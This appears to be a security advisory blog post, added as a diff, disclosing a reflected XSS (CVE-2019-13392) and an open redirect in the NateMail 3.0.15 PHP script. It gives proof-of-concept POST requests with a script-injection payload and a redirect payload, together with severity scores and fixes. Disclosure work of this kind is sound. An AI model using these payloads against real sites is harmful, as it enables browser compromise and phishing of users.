@@ -1,0 +1,155 @@
+---
+type: article
+title: NateMail Vulnerabilities – CVE-2019-13392
+tags: [XSS, Open Redirect ]
+date: 2019-10-15
+author: Eno Leriand
+featuredImage: https://lh3.googleusercontent.com/VmQl2-hDYUd_mV2nZ8VIxsvsgxMy2nTmTVWC6dZnNnVoVPDaYFGKUPfheIfXpXOG7hdUu8L2bq9bH-hux87Me3xd=h700
+---
+
+The NateMail version 3.0.15 PHP Script contains vulnerabilities allowing an XSS attack and an open redirect. Although the developer has not updated this script in years, you can find a copy of the library if you wish to verify these findings.
+Given that copies of this library are limited, and the remediation steps are straightforward, this post details the vulnerabilities with some recommendations for mitigations.
+
+**Note**: MITRE will not assign a CVE ID for the open redirect vulnerability. For more information on CVE assignments, see the reference here.
+
+### Detailed Information
+
+A reflected Cross-Site Scripting (XSS) vulnerability exists in the NateMail application, where an attacker can execute JavaScript in a victim’s browser using a crafted `POST` request.
+
+The application reflects any input not matching the required integers within the `recipient` array. Thus, injecting JavaScript outside of expected integer values enables the XSS attack.
+
+### Exploit
+
+To illustrate, the following benign payload alerts the `document.domain` in a user’s browser.
+
+#### Raw HTTP Request
+
+```http
+POST /NateMail.php HTTP/1.1
+Host: <Host/IP>
+Content-Type: application/x-www-form-urlencoded
+Connection: close
+Content-Length: 59
+
+recipient=%3cscript%3ealert(document.domain)%3c%2fscript%3e
+```
+
+#### Raw HTTP Response
+
+```http
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=UTF-8
+
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Form Results</title>
+        ...
+        <span class="MPerror">No email address was found in the recipients list with key number "<script>alert(document.domain)</script>"
+    </span>
+</html>
+```
+
+### Affected URLs and Parameters / Limiting Factors
+
+- **Parameter**: `recipient`
+- **URL**: `NateMail.php`
+- **Limitations**: The application does not require authentication; the main limitation is that a `POST` request is necessary.
+
+### Recommendations
+
+- **Sanitize** all user inputs and ensure they are output-encoded. Limit acceptable values in `recipient` to integers only, and encode any output on line 379 of `NateMail.php` to prevent JavaScript injection:
+  
+  ```php
+  $errors .= "No email address was found in the recipients list with key number \"$thisRecipKey\"<br>$le";
+  ```
+
+---
+
+## Severity 
+
+- **Severity Level**: Medium  
+- **CVSSv3 Score**: 6.1 (CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)  
+- **Damage Potential**: Attackers could use this vulnerability to launch attacks against the NateMail application, possibly compromising users’ browsers and systems.
+
+### Reproducibility and Exploitability
+
+- **Reproducibility**: Easily reproducible across all systems using NateMail up to version 3.0.15.
+- **Exploitability**: Attack requires a crafted `POST` request, typically from a controlled form by the attacker. After the form submission, the attack proceeds automatically.
+
+---
+
+## URL Redirect to Untrusted Site (Open Redirect)
+
+### Detailed Information
+
+NateMail's redirect function fails to validate the destination URL, allowing attackers to redirect users to any arbitrary URL when a valid `recipient` ID (e.g., “0”) is included.
+
+### Exploit
+
+Below is an example where the redirect parameter is abused to redirect a user to Google:
+
+#### Raw HTTP Request
+
+```http
+POST /NateMail.php HTTP/1.1
+Host: <Host/IP>
+Content-Type: application/x-www-form-urlencoded
+Connection: close
+Content-Length: 46
+
+recipient=0&redirect=http%3A%2F%2Fwww.google.com
+```
+
+#### Raw HTTP Response
+
+```http
+HTTP/1.1 302 Found
+Location: http://www.google.com
+Content-Type: text/html; charset=UTF-8
+```
+
+### Affected URLs and Parameters / Limiting Factors
+
+- **Parameter**: `redirect`
+- **URL**: `NateMail.php`
+- **Limitations**: No authentication is required, but a `POST` request is needed.
+
+### Recommendations
+
+- **Whitelist URLs** in `redirect` to a predefined list of trusted URLs. Ensure validation checks and headers are in place on line 638 of `NateMail.php`.
+
+```php
+        if ($redirect != "") {
+            $printHTML = false;
+            if ($redirect_type == "include") {
+                include("$redirect");
+                } else if ($redirect_type == "query") {
+                $queryArray = "";
+                $q = 0;
+                for ($n=0; $n<count($displayArray); $n++) {
+                    if ($displayArray[$n]['value'] != "") {
+                        $queryPair = MPParseRedirectData($displayArray[$n]['key'])."=".MPParseRedirectData($displayArray[$n]['value']);
+                        if ($queryPair != "=") {
+                            $queryArray[$q] = $queryPair;
+                            $q++;
+                            }
+                        }
+                    }
+                $redirectPage = "Location: $redirect";
+```
+
+## Severity 
+
+- **Severity Level**: Medium  
+- **CVSSv3 Score**: 6.1  
+- **Damage Potential**: Phishing attacks, possible malware distribution, and other social engineering attacks leveraging this redirect vulnerability.
+
+### Reproducibility and Exploitability
+
+- **Reproducibility**: Easily reproduced on any system with NateMail version 3.0.15 or earlier.
+- **Exploitability**: Attack requires a `POST` request and the user’s click on a crafted phishing link.
+
+## Conclusion
+
+Although these vulnerabilities are straightforward, they illustrate the importance of regular security practices in legacy code. For anyone using or developing based on NateMail, implementing these fixes will mitigate the issues described above. 
